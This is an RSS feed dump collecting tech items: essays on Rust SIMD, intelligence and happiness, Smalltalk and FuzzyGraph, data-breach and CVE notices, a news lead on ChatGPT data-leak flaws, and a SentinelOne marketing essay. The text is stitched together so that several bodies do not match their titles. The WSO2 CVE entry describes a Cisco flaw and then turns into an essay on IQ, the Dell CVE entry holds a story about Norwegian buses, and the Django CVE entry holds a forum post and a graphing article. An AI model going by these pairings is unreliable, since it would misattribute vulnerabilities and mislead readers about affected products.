don’t mind nightly,  if you don’t need multiversioning, and otherwise  or .If it’s not 2025 when you’re reading this, check out , because  is  in nightly in your glorious future, isn’t it?If you want to get really close to the metal, there are always the raw intrinsics, just one step removed from the processor instructions.The problem looming over any use of raw intrinsics is that you have to manually write them for every platform and instruction set you’re targeting. Whereas  or  let you write your logic once and compile it down to the assembly automatically, with intrinsics you have to write a separate implementation for every single platform and instruction set (SSE, AVX, NEON…) you care to support. That’s a lot of code!It’s really not helped by the fact that they are all named something like  and your code ends up as a long list of calls to these arcanely named functions. And wrappers that help readability introduce their own problems, such as clashes with multiversioning or unsafe code or arcane macros.You also have to build your own multiversioning. Or rather, you have to manually dispatch to the dedicated implementation you have manually written for each instruction set.  macro takes care of the feature detection, but it is somewhat slow. In some cases it is beneficial to detect available features exactly once and then cache the results, but you have to implement that manually too.On the bright side, this year writing intrinsics got markedly less awful. Most of them are no longer  to call in Rust 1.87 and later, and the safe_unaligned_simd crate provides safe wrappers for the rest.So at least this approach is no longer  on top of all the other problems it has!Which one is right for you?The right tool for the job ultimately depends on the use case.Want zero dependencies and little up-front hassle? Autovectorization. Porting existing C code or targeting very specific hardware? Intrinsics. Anything else? Portable SIMD abstraction.And now that you made it this far, you can understand the table at the top of the article, which will help guide your decision!]]></content:encoded></item><item><title>Dillo, a multi-platform graphical web browser</title><link>https://github.com/dillo-browser/dillo</link><author>nazgulsenpai</author><category>dev</category><pubDate>Wed, 5 Nov 2025 18:40:32 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-11093 - Arbitrary Code Execution with higher privileged users in Multiple WSO2 Products via Script Mediator Engines (GraalJS and NashornJS)</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11093</link><author></author><category>vulns</category><pubDate>Wed, 5 Nov 2025 18:31:17 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11093

A vulnerability in the Java Remote Method Invocation (RMI) process of Cisco Unified CCX could allow an unauthenticated, remote attacker to upload arbitrary files and execute arbitrary commands with root permissions on an affected system.

This vulnerability is due to improper authentication mechanisms that are associated to specific Cisco Unified CCX features. An attacker could exploit this vulnerability by uploading a crafted file to an affected system through the Java RMI process. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system and elevate privileges to root.

It is not merely book learning, a narrow academic skill, or test-taking smarts. Rather, it reflects a broader and deeper capability for comprehending our surroundings-“catching on,” “making sense” of things, or “figuring out” what to do […] Intelligence, so defined, can be measured, and intelligence tests measure it well.Intelligence sounds pretty great. Who doesn’t want to “catch on” and “make sense”? Hell, “figuring out” what to do is pretty much all of life!Naturally, people with more of this mental horsepower must live happier lives. When they encounter a problem, they should use their superior problem-solving ability to solve it. Smarter people should do a better job making plans and getting what they want, and they should learn more from their mistakes and subsequently make fewer of them. All of this should add up to a life that makes smart people go “this life rules!”So smarter people are happier, right?nomaybe a teeny tiny bitfindsGeneral Social SurveyseemshereBut even if intelligence tests only measure something like “ability to succeed in an unfair society” or “willingness to try hard,” it only deepens the mystery. Shouldn’t those people end up with happier lives, however unfair that may be?agreeCharles Spearmantended to do wellwroteThis continued tendency to success of the same person throughout all variations of both form and subject-matter—that is to say throughout all conscious aspects of cognition whatever—appears only explicable by some factor lying deeper than the phenomena of consciousness.Helpfully, he also drew us a picture:this review from 2006In the study of intelligence, one empirical phenomenon is well established: Test scores on cognitive tasks show a positive manifold, that is, they are invariably positively intercorrelated, albeit to varying degrees. This implies that people who score well on one cognitive test are likely to score well on other cognitive tests. The positive manifold is a robust phenomenon.We think tests of math, vocabulary, French, music, etc. are all different because some are about words and others are about numbers and others are about sounds. But psychology, like all sciences, is all about discovering the differences between seemingly similar things, and discovering the similarities between seemingly different things. If psychologists ever had to march into battle, a good candidate for our crests may be the famous Müller-Lyer illusion, the two lines that look like they’re different lengths but aren’t:Just like those lines, I think all of our various tests of intelligence aren’t as different as they seem. They’re all full of problems that have a few important things in common:There are stable relationships between the variables.There’s no disagreement about whether the problems are problems, or whether they’ve been solved.There have clear boundaries; there is a finite amount of relevant information and possible actions.The problems are repeatable. Although the details may change, the process for solving the problems does not.We all share some blame with Spearman, of course, because everybody talks about smarts as if they’re one thing. Google “smartest people in the world” and most of the results will be physicists, mathematicians, computer scientists, and chess masters. These are all difficult problems, but they are well-defined, and that makes it easy to rank people. The best chess player in the world is the one who can beat everybody else. The best mathematician is the one who can solve the problems that nobody else could solve. That makes it seem like the best chess players and mathematicians are not just the smartest in their fields, but the smartest in the whole world.This is why the people who score well on intelligence tests and win lots of chess games are no happier than the people who flunk the tests and lose at chess: well-defined and poorly defined problems require completely different problem-solving skills. Life ain’t chess! Nobody agrees on the rules, the pieces do whatever they want, and the board covers the whole globe, as well as the inside of your head and possibly several metaphysical planes as well.Here’s another way of looking at it.Say you want to test people’s math ability. You design a test, administer it to a bunch of people, do all your psychometrics, etc. You’re feeling pretty good about your math test. And then you find that some of the people who ace your test later say things like “two plus two is 19” and “88 is the biggest number.” You’d feel pretty embarrassed about your math test because it’s clearly not measuring mathematical ability, if it’s measuring anything at all.Christopher LanganbelievesJohn Sununu176military jetsclaimedsexually harassing colleagues and studentscompletely making up datahanging out with a known pedophile~15 IQ pointsRaven’s Progressive Matrices(To be clear, I still think it’s good we did all this. Polio sucks and going to the moon is awesome.)The Science of Wellbeinghacking the hedonic treadmillyou’re probably wrongSo if you’re really looking for a transformative change in your happiness, you might be better off reading something ancient. The great thinkers of the distant past seemed obsessed with figuring out how to live good lives: Socrates, Plato, Aristotle, Epicurus, Buddha, Confucius, Jesus, Marcus Aurelius, St. Augustine, even up through Thoreau and Vivekananda. But at some point, this kind of stuff apparently fell out of fashion.a god floating in the skyother peopleeight intelligencestrytend to score high on the others, tooProblem #2: When you label every human activity as its own intelligence, you give up any hope of understanding anything about the structure of problems in the world or how people solve them. We can make up whatever categories we want; they aren’t given by God. The only reason to use some categories and not others is that some categories are useful and others aren’t.For instance, we could have created a periodic table that organized the elements alphabetically, or by color, or by how good they taste. Instead we organize them by atomic number, not because it’s their “true” order, but because it’s useful. It helps us realize things like, “Hey, we’ve got a number 62 and a number 64—I wonder if there’s a number 63 out there. We should go looking for it.”And that’s not all we can do.That doesn’t mean the problems AI has solved so far are stupid or trivial. They’re really important and interesting! They’re just all well-defined problems. And we should expect that pattern to continue: for any well-defined problem, AI will eventually outperform humans. But for poorly defined problems, AI is hopeless. To solve those, we need humans running around doing weird human stuff.GPT-3DALLE-2AI art isn’t artIf you booted up a super-smart AI in ancient Greece, fed it all human knowledge, and asked it how to land on the moon, it would respond “You can’t land on the moon. The moon is a god floating in the sky.” How would you get it to realize the moon is actually a big rock? That’s a great, poorly defined problem, and I don’t expect AI to solve it anytime soon.Here’s one last advantage of dividing intelligence into well-defined problem-solving and poorly defined problem-solving: it reminds us to give some respect where respect is due.MensaPrometheus Societyexplaining IQPeople who are good at solving poorly defined problems don’t get the same kind of kudos. They don’t get any special titles or clubs. There is no test they can take that will spit out a big, honking number that will make everybody respect them.Excluding this kind of intelligence from our definitions doesn’t just hurt our grandmas—it hurts us too. If you don’t value the ability to solve poorly defined problems, you’ll never get more of it. You won’t seek out people who have that ability and try to learn from them, nor will you listen to them when they have something important to say. You’ll spend your whole life trying to solve problems with cleverness when what you really need is wisdom. And you’ll wonder why it never really seems to work. All of your optimizing, your straining to achieve and advance, your ruthless crusade to eliminate all of the well-defined problems from your life—it doesn’t actually seem make your life any better.If you’re stuck trying to solve poorly defined problems with your slick, well-defined problem-solving skills and you’re lucky enough to have a grandma like mine still on this Earth, my god, go see her. Shut up and listen to her for a while. And once you’ve learned something, maybe ask her if she needs help with her TV.]]></content:encoded></item><item><title>CVE-2025-45379 - Dell CloudLink Command Injection Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-45379</link><author></author><category>vulns</category><pubDate>Wed, 5 Nov 2025 16:31:57 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-45379

The transport operator stressed there is no evidence of misuse but said the discovery moves concerns “from suspicion to concrete knowledge”.Ruter has removed the SIM cards and is strengthening procurement rules, internal firewalls, and cloud-security requirements to ensure full local control over transport operations.Norway’s Minister of Transport Jon-Ivar Nygård told national broadcaster NRK that the government is assessing supplier risks from countries outside Norway’s security alliances, noting the need to protect critical infrastructure.Around 1,300 electric buses operate in Norway, including approximately 850 units from Yutong, with 300 running in Oslo and Akershus. Ruter said the likelihood of attempted interference remains low, but the situation underscores the growing cybersecurity challenges linked to foreign technology suppliers.The case comes as Chinese electric buses are increasingly adopted across global markets, including Southeast Asia, raising wider questions about digital security and strategic dependencies in public transport systems.“It’s unlikely these buses would ever be misused,” Ruter CEO Bernt Reitan Jenssen said, “but we must take the risk seriously.”]]></content:encoded></item><item><title>Updates to Domainname API, (Wed, Nov 5th)</title><link>https://isc.sans.edu/diary/rss/32452</link><author></author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 16:17:17 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[For several years, we have offered a "new domain" list of recently registered (or, more accurately, recently discovered) domains.

But many of the details of how objects work are directly inspired by Smalltalk, including the idea that every piece of data is part of the object system.Also unlike Perl, I spent a good couple of years working in Smalltalk, and it is one of my favorite languages that I’ll never likely use in anger again.(A Personal) History of SmalltalkSmalltalk originated in the same Xerox PARC team that invented the windowed interface, ethernet, and the laser printer, and who knows what else, they may have invented ice cream and rainbows.There’s a whole story about what project Smalltalk was invented to be a part of, and a whole alternate history of computing and how people interact with computers that we are going to largely ignore. (If you are interested, start by searching for “Alan Kay Dynabook”.)Smalltalk went through a few different iterations in the 1970s, but the version that we know today is a direct descendent of Smalltalk-80, which was the first version released to the wider world.For most of the 80s and 90s, Smalltalk was something that doesn’t really exist today – a programming language and environment that companies paid money to use. Lots of money. The major player was ParcPlace, which was a spinoff of Xerox that provided Smalltalk tools. Their commercial product was originally called ObjectWorks, later changed to VisualWorks, and eventually sold off and presumably slowly losing customers after the late 90s.Smalltalk was pretty big in the industry for a while. Most of the aviation industry ran on it in the 90s, the big payroll project that was the basis for Extreme Programming was a Smalltalk project, there was reasonably high demand for Smalltalk programmers through at least the mid 1990s. I taught an undergrad OO class in Smalltalk in 1997 and 1998 to students that wanted to be learning C++, and I remember telling them that Smalltalk programmers were paid more.I first encountered Smalltalk as a grad student in about 1993, where Georgia Tech used ObjectWorks to teach Smalltalk and Object-Oriented programming (there’s a whole other sidebar about how Object-Oriented languages came to prominence in the 90s, and the arguments over that but again, another day). ObjectWorks was pricey, and there was also a lower-cost vendor called Digitalk, and eventually I also used a product called Smalltalk Agents, which has apparently totally vanished from the entire internet.In 1995, a bunch of the original Xerox Smalltalk team was together at Apple, and they decided to release an open-source Smalltalk VM. What they did was very interesting. They wrote a very, very small kernel in very vanilla C, and then 95% of the environment was then built in Smalltalk on top of that. Oh, and even the vanilla C was written in Smalltalk, they wrote a Smalltalk to C compiler. They called their new Smalltalk “Squeak”, which made a lot more sense when they all moved en masse to Disney.The fact that Squeak was largely written in itself made it fairly easy to port to new systems, and it was quickly available on just about anything with a microchip.I’m pretty sure that I first saw Squeak at the OOPSLA conference in 1997. (Object-Oriented Programming, Systems, Languages & Applications, since you asked) At this conference I somehow got to do a team-building exercise with Adelde Goldberg from the original Xerox PARC team, which is not relevant to anything but seemed very cool at the time. I was already using Smalltalk in my projects, but Squeak was immediately interesting and my extended research team started doing cool stuff. Like, what I’m pretty sure was the first Wiki tool outside the original C2 Wiki, was written in Squeak. (Apparently at least one is still running).It’s important to understand that Smalltalk’s development is a different evolutionary tree from nearly every currently popular programming language, in that Smalltalk is in no way, shape, or form influenced by Unix or C. Perl, Ruby, Python, JavaScript, Swift, Kotlin and on and on, all come from a universe where they expect to run Unix libraries, and where C syntax is normal. The Unix philosophy of “small pieces, loosely joined” is not a part of Smalltalk’s DNA at all.Smalltalk is basically its own operating system, and the syntax is different from C-style languages in ways big and small. For example, the first element of an array is… 1. Which, when you think about how people count, actually makes sense.It’s hard to separate Smalltalk the language from Smalltalk the environment, although I suppose technically you could have the language without the whole shebang (and I think there was a GNU Smalltalk that tried this), really the environment is part of the appeal.Your main interfaces to the smalltalk system are a  and a . A workspace is analogous to REPL session, you can type in arbitrary Smalltalk code and have the system “do it” to execute the code, “print it” to execute the code and output the result. There are some other actions like “debug it” or “inspect it”, but that’s the basic idea. Unlike a Unix REPL, there’s no prompt, and you don’t automatically invoke code by hitting return, you have to select code and then invoke the menu item or the keyboard shortcut for the code you want to act on.The Browser is where you write code. There a a few different versions in most Smalltalks, here’s the main one, this is from a modern Smalltalk called Cuis.At the top, we have four window panes – left to right we have:Categories – groups of classes that are related in some way. Cuis nicely puts each group in a pulldown list. Categories have no particular syntactic meaning, they are just there to make browsing easier.Classes – one entry for each class in the currently selected category, at the bottom of this pane is a toggle for “class” vs. “instance” which determines what kinds of messages are shown in the next two panes.Protocols – a protocol is a user-defined group of messages. Smalltalk internally uses “message” rather than “method” because of how Alan Kay thinks about objects. Again, protocols are for the programmer, not the system.Messages – each messages in the currently selected protocol is listed.The bottom pane is the code editor, and if a message is selected in the code pane, its code is displayed there.You probably have questions:Does this mean that you can see the source code for the entire Smalltalk system?**Can you modify any code in the system? **Even, like, deep system code?As a Ruby developer, you should know that it’s only as dangerous as the developers who use it.How do you edit a message?Just display the existing message in the browser, edit the message and select “save”. The Smalltalk system will parse the code, stop if there are syntax errors, but if not, the updated method will be saved to the system. A side effect is you can’t save code that isn’t syntactically parsable, even as a draft.Okay, but how do you  a message?The “real” way is to select a protocol but not a message, and Smalltalk will put a template in the edit window. Write your message in the editor and save it. Alternately, you can just change the name of a message in the edit window, and a new method with that name will be created, without deleting the old message.And how do you create a class?If you select a category and not a class, you’ll get this in the code editor pane:The thing to note is that this is not actually template, it’s actually code: a message, waiting for you to fill in the arguments, replacing  and adding the instance variables and so on. You don’t save this, you “do it”, just like if you were in a workspace. The message call is evaluated, and Smalltalk creates a new class.But wait, if all the code is in the image and isn’t in text files, how do people work together and share code?Seriously, though, worry about it.This has always been a problem. Smalltalk allows you to share “change sets”, effectively the code differences between one point and another. Classically, one person would export their change set, and other team members would import it. Different Smalltalks have built up more sophisticated tools over time.Smalltalk’s syntax is very simple, relative to Ruby and Perl.Wait a sec, I literally wrote this for a chapter in a book about Smalltalk literally 25 years ago, here’s a slight paraphrase:Every line of Smalltalk is evaluated the same way.Every variable is an object. There are no basic types that are not objects.Every expression is a message being passed to an object, there is basically no expression syntax that is not a message.All messages return a value. (The return value is specified by , if the method does not specify a return value, it implicitly returns , the instance that received the message.)There are three kinds of messages:Unary messages like Binary messages like , these actually are messages you can define, there is a small set of them, and they are special cases in the parser.Keyword messages such as . This syntax got used by ObjectiveC and later Swift, so you may be familiar with it. It’s receiver <messagepart>: <argument> where you can have multiple message parts. If you are referring to the message, typically you just say the message parts, so this message would be called Smalltalk does not have operator precedence. All code is evaluated strictly from left to right. Unary messages first, binary messages second, keyword messages last. Parenthesis can be used to force order of operations or to make things clearer.The assignment operator is  (Smalltalk uses  for boolean equality), the right hand side is evaluated and the value is assigned to the result of the left hand side.And that’s basically it, with a couple of ways to create literals like strings, arrays, dictionaries, local variables, and blocks.So, for 10 points and control of the board, what does this do?hypotenuse := 3 squared + 4 squared sqrtThe unary messages are evaluated first:hypotenuse := 9 + 16 sqrtThere’s still a unary messageNow we can do the binary message:To get what you actually want, you need parentheses:hypotenuse := (3 squared + 4 squared) sqrtSmalltalk does not have special syntax for loops, all loop behavior is defined by methods on  and the like, very similar to Ruby’s .Smalltalk does not have special syntax to create messages or classes. Message creation is managed by the editor (which internally calls a message that adds the new code), class creation is just another method – in Squeak, that method is Object#subclass:instanceVariableNames:classVariableNames:poolDictionaries:category:.Smalltalk does not have special syntax for boolean logic, all logic behavior is defined by the classes  and . Ruby sort of does this, but Ruby does have  as special syntax. Smalltalk does not, you’d write a Smalltalk conditional as just another message:(x > 10) ifTrue: [ x squared ] ifFalse: [ x sqrt ]
The square brackets are blocks, and behave very similar to Ruby blocks, except that you can treat them as just normal variables and normal arguments. You can even, as in this case, have multiple arguments that take blocks.The implementation if the method  is simple. For the  class, it just takes the true block and executes it by passing it the message .ifTrue: trueAlternativeBlock ifFalse: falseAlternativeBlock
	^trueAlternativeBlock value
And for the false class, the exact opposite:ifTrue: trueAlternativeBlock ifFalse: falseAlternativeBlock
	^falseAlternativeBlock value
Smalltalk doesn’t have a  or  statement, typically if you want behavior like that you’d define a dictionary of keys to blocks or you would use the object system and polymorphism and double dispatch.There’s a lot about Smalltalk’s object model that sound familiar to a Ruby developer:There’s a base class called  that everything inherits from.Instance variables are private. Getters and setters default to having the same name as the instance variable.Method lookup happens at the point of the method call.Classes are instances of the class  (sort of).There’s a thing called a “Metaclass”There’s a method that’s the method of last resort – in Ruby, it’s , but in Smalltalk it’s called There are a couple of differences as wellSmalltalk’s meta classes are structured differently, I explained this once and I’m not sure I ever want to explain it again.Smalltalk doesn’t have multiple inheritance or mixins or modules or anything like that. Although there have been some attempts to add these features, the traditional Smalltalk way to do this is through delegation.But overall, Smalltalk and Ruby are similar enough that a huge amount of Kent Beck’s Smalltalk Best Practice Patterns is applicable to Ruby as long as you translate the syntax.Unlike Perl, I actually did use Smallalk to build a few real applications that had real users. I miss it a lot.I find that when I try to explain Smalltalk to people, it’s easy to explain the syntax and the object model. What’s hard to explain is how it is to work in a Smalltalk environment.You’ve likely used powerful coding editors and terminals. Smalltalk is just different. You are in the running environment.Tests start instantly, and in general run very fast. There’s a dedicated test runner window. Some smalltalk integrate tests with the regular browser, so you can see test status from the code browsers.Debugging is amazing, you can investigate the state of any object in the system, you can change that state, you can easily execute arbitrary code. You can have a test halt on exception, update the code and re-run from the point failure. It’s hard to describe how fluid it is, especially since I’m no longer expert enough to do it fluently.While the editor doesn’t have all the niceties of the IDE’s you are used to, it’s very powerful in its own way. If you save code with a message name that does not appear in the image at all, Smalltalk will typically ask you if you want to define it right there. A lot of the things we ask a Language Server to do, Smalltalk just kind of does, because the image has access to everything.But the all-encompassing nature of the environment was also Smalltalk’s downfall. As more and more of the general computing environment became Unix and the “small pieces loosely joined” philosophy, Smalltalk got harder and harder to integrate. Smalltalk isn’t a scripting language, it was late to develop connectivity to external databases, its model of team interaction is fundamentally different from Unix source control. The image-based system has some drawbacks – you do get amazing access to the system, but it can be hard to tell where your code ends and the system begins. Code could depend on the state of the image in ways that were hard to replicate in deploys.What Did Ruby Take From Smalltalk?Smalltalk’s legacy in Ruby is primarily the object model – the idea that everything is an object and everything is manageable via method calls, and that message calls are evaluated at the point of call, as late as possible. Ruby takes that idea and translates it into a syntax that is more familiar to programmers used to C/Perl/Java.I’m not sure this is exactly on point as far as Smalltalk’s influence on Ruby, but my Ruby style has always been very aggressive about creating new classes and objects. I’m quite confident that a reason for that style is that I came from Smalltalk first and not Java, Smalltalk style is much more amenable to small classes.On my first largish Smalltalk project, users were simulating a chemical plant’s pipe system by placing tiles with pipes in them, and I frequently needed to do logic based on relative directions. I clearly remember creating a  class with basically four live instances, , , , , and just enough logic inside to say that  equals , but  equals . It was useful enough that I remember how much fun it was to build it even  now, nearly thirty years later.Of all the other programming languages I’ve used, Ruby is the one that most clearly encourages that style of coding.]]></content:encoded></item><item><title>CVE-2025-64459 - Potential SQL injection via _connector keyword argument in QuerySet and Q objects</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64459</link><author></author><category>vulns</category><pubDate>Wed, 5 Nov 2025 15:15:41 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64459

We use it for customer management, ordering, invoicing, kit management/build tickets, financials - everything. We've transitioned from green screen terminals to modern emulators, but the core system remains. I spent many summers running serial and ethernet cables.I left the business years ago to become a full time software engineer, but I got my start as a script kiddie writing automations for this system with Microsoft Access, VBA, and SendKeys to automate data entry. Amazingly, they still have a Windows XP machine running many of those tasks I wrote back in 2004! It's brittle, but cumulatively has probably saved years of time. That XP machine could survive a nuclear winter lol.I recently stepped back in to help my parents and spent a day converting many of those old scripts to a more modern system (with actual error-handling instead of strategic sleep()s and prayers) using Python and telnetlib3. I had a blast and still love this application. I can fly around in it. Training new people was always a pain, but for those that got it—they had super powers.This got me thinking: Are other companies still using this type of interface to drive their core operations? I’m reflecting on whether the only reason my family's business still uses this system is because of the efficiency hacks I put in place 20+ years ago. Without them, would they have been forced to switch to a modern cloud/GUI system? I’m not sure if I’m blinded by nostalgia or if this application is truly as wonderful as I remember it.I’d love to hear if and how these are still being utilized in the real world.P.S. The system we use was originally sold by ADP and has had different names (D2K, Prophet21). I believe Epicor owns it now (Activant before).P.P.S. Is anybody migrating their old TUI automation scripts to a more modern framework or creating new ones?

                        If you've ever graphed equations, chances are you have only ever graphed equations in what I refer to as "Binary mode" - which draws a line where the equation is EXACTLY equal, and leaves white everywhere else.FuzzyGraph, on the other hand,  - showing not only where an equation are exactly equal, but also where the equation  and where the equation is  (where the error is high). And when we look at things in this , we can suddenly see the previously invisible  .Let's look at some examples...Example 1: Slash Dot EquationHere is the "Slash Dot" Equation ( \( \frac{y}{x^2+y^2} = \frac{x+1}{x^2+y^2} \)) as both a conventional and fuzzy graph...Note the giant black hole that is present in the Fuzzy/Non-Binary graph, but invisible in conventional/Binary graphing. This "black hole" feature represents a region of high error in the equation.Example 2: Quasar EquationLet's look at another example: \(y = \frac{x}{x^2 + y^2} \)

                        Notice that the  in the conventional/binary mode of graphing.Example 3: Simple Star and Black HoleTo get a better idea of what these black hole things are, let's look at a simpler example. First let's look at the opposite of a black hole - a simple star/particle example: \( x^2 + y^2 = 0 \). For this equation, there is only 1 solution: (0, 0). So if you graph this in a conventional graphing app, it will only show a single dot at (0, 0). But in FuzzyGraph, it looks like a fuzzy particle or something.But now, let's invert this to get the "Black Hole Equation": \( \frac{1}{x^2+y^2} = 0 \)...In this case, there is absolutely nothing to show on a conventional graph, as there are actual solutions to this equations. However, there is still a mathematical topography which can be visualized (as can be seen in the fuzzy graph).Not all of the  are like black holes.In this example, let's start by combining 2 lines together: \(y=x\) and \(y=-x\).We can visually add 2 equations together by refactoring them so they are both equal to 0, and then multiplying the two refactored equations together. \(y=x\) can be changed to \(y-x=0\), and \(y=-x\) can be refactored to \(y+x=0\).We can then combine 2 into a single equation these like this: \( (y-x) \times (y+x) = 0 \)And now, : \( \frac{x-y}{x+y} = 0 \)So as you can see, the line that was inverted (under the division line) is now a . And this seems like a more "correct" way to visualize this than as the conventional graph shows it (which is indistinguishable from the simpler equation, \(y-x=0\)).This equation works almost exactly as the previous. And like before, let's start with multiplication to combine 2 equations (in this case, a circle and a vertical line equation): \( x \times (x^2+y^2-1) = 0 \). But now, let's , which makes the equation: \( \frac{x}{x^2+y^2-1} = 0 \).Note that the . In fact, the conventional graph looks identical to a conventional graph of the \(x=0\) equation (as if the denominator was not there).Example 6: Underwater IslandsIn all of these previous examples, the "shadows" have represented areas of high error. But in this last example, we'll see some hidden details that represent areas of low error - areas that are  solutions to the equation.Consider the equation, \( y=4 sin(x)+ sin(2.7y) \), as both a conventional graph and a fuzzy graph:Note the floating dots in the fuzzy graph version that are not there in the conventional/binary graph. These are like underwater islands - underwater mountains that are just below the surface of the water (or in this case, the \( error == 0 \) surface). These hidden islands represent area that are near-solutions to the equation (which are only visible in FuzzyGraph).Their presense hints that we can tweak the equation slightly to cause them to burst above the surface of the water (which should also make them visible in conventional graphs).So let's change the equation from:   \( y=4 sin(x)+ sin(2.7y) \) to:  \( y=4 sin(x)+ sin(2.8y) \)...And as you can see, . So Fuzzy/non-binary graphing can help us see features of the mathematical topography that are completely invisible with conventional/binary.In discussing this topic, some have remarked that a Fuzzy graph is not a graph of the original equation, but rather a heatmap of the "error divergence map". And to be fair, the equation typed into FuzzyGraph must be modified a little - to calculate the fuzzy graph, you have to take \( |left-right|^{fuzzyLevel} \).But... I would argue that in order to visualize an equation in the conventional/binary form, the equation is being modified there as well. The logic to visualize an equation in the conventional/binary mode would look something like: .Date published: 2025-11-05]]></content:encoded></item><item><title>Hack exposes Kansas City, Kansas, Police’s secret officer misconduct list</title><link>https://databreaches.net/2025/11/05/hack-exposes-kansas-city-kansas-polices-secret-officer-misconduct-list/?pk_campaign=feed&amp;pk_kwd=hack-exposes-kansas-city-kansas-polices-secret-officer-misconduct-list</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 5 Nov 2025 14:18:22 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Swedish IT Company Data Breach Exposes Personal Details of 1.5 Million Users</title><link>https://databreaches.net/2025/11/05/swedish-it-company-data-breach-exposes-personal-details-of-1-5-million-users/?pk_campaign=feed&amp;pk_kwd=swedish-it-company-data-breach-exposes-personal-details-of-1-5-million-users</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 5 Nov 2025 14:12:35 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Researchers Find ChatGPT Vulnerabilities That Let Attackers Trick AI Into Leaking Data</title><link>https://thehackernews.com/2025/11/researchers-find-chatgpt.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjc9u8ifBTtqcucAGtnB5BSuB4Zu2PTcSopIDhD1mxnUeFmAtb1KWyJuU3Yb8JAnJ-nQ4jltxhO5YCFzfd-VhbghvU9B8DewcX9kDZ4Wv65q-3Sqnj-tyAtaL2BNI_poMHKzeJMr93cjTv7U9lqZFSpLOgs0mYOjIA0QqYydcxGmxxqZGS-YS8hJUi8sdsJ/s1600/chatgpt-hack.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 14:04:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed a new set of vulnerabilities impacting OpenAI's ChatGPT artificial intelligence (AI) chatbot that could be exploited by an attacker to steal personal information from users' memories and chat histories without their knowledge.

Cloud gave us scale. AI is giving us cognition – systems that can reason, decide, and act.Firewalls helped the internet era. Workload protection helped the cloud era. And, in the AI era, you have AI Security.This is a new field and frontier that requires mastering two disciplines at once. – Governing and protecting the usage of AI itself. Models, data, agents, and the users and developers who rely on them. In many cases, this is also done by AI. – Applying agentic AI and machine learning to solve today’s biggest cybersecurity challenge: Staying ahead of AI-powered attacks by detecting, investigating, and responding at machine speed.Most importantly, in this era, the architecture and infrastructure needed to truly benefit from AI will be the determining factor to successfully secure it. Quality of data, inclusivity of data, cardinality, and latency will be critical, as will be the tools and technologies facilitating those.At OneCon 2025, we are laying out a practical path to secure this new world. The opportunities AI creates, the risks it introduces. The strategy and product innovation you can put to work today to accelerate and de-risk your AI journey.AI: Business Accelerant & New Attack SurfaceThe need for these dual disciplines is driven by the rapid increase in AI usage itself – both by good and bad forces.AI is accelerating everything. It is transforming how businesses operate, how employees work, and how attackers adapt. Across every single industry, AI is becoming embedded into processes, tools and workflows in every team. Marketing teams use it to generate content. Developers use it to write code. Legal, HR and finance all use it to summarize and automate tasks. AI is now woven into the very fabric of how organizations think and operate.While holding incredible potential benefits, this transformation is also introducing massive new security risks. Traditional security controls are blind to the data that employees are entering into 3rd-party AI models. Security teams lack visibility into the growing ecosystem of AI tools and assistants spreading across every single enterprise. AI-based browsers that integrate chat or summarization features create new pathways for data exposure. And the rise of Model Context Protocol (MCP) servers that connect agents to agents introduces an entirely new layer of risk that most organizations are not equipped to monitor or govern today.Meanwhile, adversaries are evolving just as quickly. They are using AI to increase efficiency, precision, and their reach. Non-native English speakers can now craft a convincing, localized spearphishing campaign in minutes. LLMs are being used to write polymorphic malware that mutates faster than traditional defenses can react. Attackers are automating their reconnaissance, identifying vulnerabilities through natural language interfaces, and even embedding AI models directly inside malware to adapt in real time.The result is a security gap that spans both sides of the equation – on one side, AI as a catalyst for real business innovation and, on the other, AI as an enabler of attack and massive risk exposure.Building Security in the Age of AI: Three Critical PrinciplesProtecting this new world requires visibility, intelligent automation, and governance that can move at the same speed as AI itself. In solving for that, we believe in a simple yet critical guiding philosophy to delivering effective AI Security – three critical principles that inform everything that we build and anchor any platform-level defense. – Security must think, not react. Static signatures and brittle logic can’t match the velocity of modern threats. True protection emerges when AI continuously learns, reasons, and adapts — detecting intent, not just pattern. – Machines should act at machine speed, but always within human-defined guardrails and system supervision. The future of defense is autonomous, but never ungoverned where AI decisions remain explainable, traceable, and aligned with human values. – Effective AI security fuses signals from endpoints, identities, and clouds into one coherent understanding. Insight without context is noise; action without context is chaos. The synthesis of both creates real-time, end-to-end resilience.These principles map directly to the questions customers ask us every day.How do I better defend my organization?How do I outpace threats?How do I get the most from my people and partners?SentinelOne’s AI AdvantageWhen it comes to making AI Security real today, SentinelOne is in a unique position. We have been AI-native since day one. Automation has been foundational from the start, not a bolt-on. And, we’ve been using agentic approaches and workflows in live security environments before it became the buzzword du jour.At launch, we were among the first to apply machine learning to malware detection and prevention. That broke the decades-old pattern of pushing static signatures to endpoints many times a day. Instead of distributing new rules after every outbreak, we trained lightweight predictive models that identified malicious behavior on their own. That meant detecting never-before-seen threats in real time at massive scale.That innovation reshaped endpoint security and set the foundation for what followed. The same principles of data-driven models, autonomous decision making, and behavioral analytics evolved into the Singularity Platform and now power Purple AI, our agentic system that changes how analysts detect, investigate, and respond. Together, they extend protection and intelligence across endpoint, identity, cloud, and AI. It is an entire platform built on and enhanced by AI. This is how we keep our customers safe: By delivering real time security that is predictive and adaptive, at planet scale.This year we took the next step with two focused acquisitions: – A portfolio built to secure AI use cases and protect how employees, developers, and 